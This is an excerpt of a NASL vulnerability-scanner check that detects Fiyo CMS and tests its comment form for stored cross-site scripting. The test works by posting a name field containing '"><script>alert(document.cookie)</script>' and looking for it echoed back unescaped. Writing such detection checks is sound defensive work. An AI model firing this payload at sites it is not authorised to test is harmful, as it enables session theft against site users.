...
for dir in nasl_make_list_unique( "/", "/fiyo", "/fiyocms", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/login.php" ), port: http_port );
	if(ContainsString( rcvRes, ">Fiyo CMS<" )){
		url = dir + "/about#comments";
		postData = "name=\"><script>alert(document.cookie)</script>" + "&email=test@test.com&web=&com=test&secure=1&send-comment=Send";
		...
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" ) && ContainsString( rcvRes, ">About Fiyo CMS" )){
